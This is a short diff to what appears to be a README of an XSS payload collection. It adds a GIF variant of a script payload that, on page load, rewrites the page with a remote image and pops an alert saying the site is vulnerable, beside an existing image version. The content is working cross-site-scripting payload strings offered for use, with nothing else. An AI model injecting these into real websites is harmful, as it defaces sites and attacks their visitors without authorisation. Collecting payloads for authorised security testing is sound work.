@@ -8,6 +8,10 @@
 ```js
 <script>function a() { document.write("<img src='https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/XSS-image/image/kostaakatil.webp'></img>"); }; window.onload = a; alert("A Hidden scripted image, warning you are vulnerable!");</script>
 ```
+- - - GIF
+```bash
+<script>function a() { document.write("<img src='https://media.giphy.com/media/y4E6VumnBbIfm/giphy.gif'></img>"); }; window.onload = a; alert("A Hidden scripted image, warning you are vulnerable!");</script>
+```
 # Image
 
 ```js
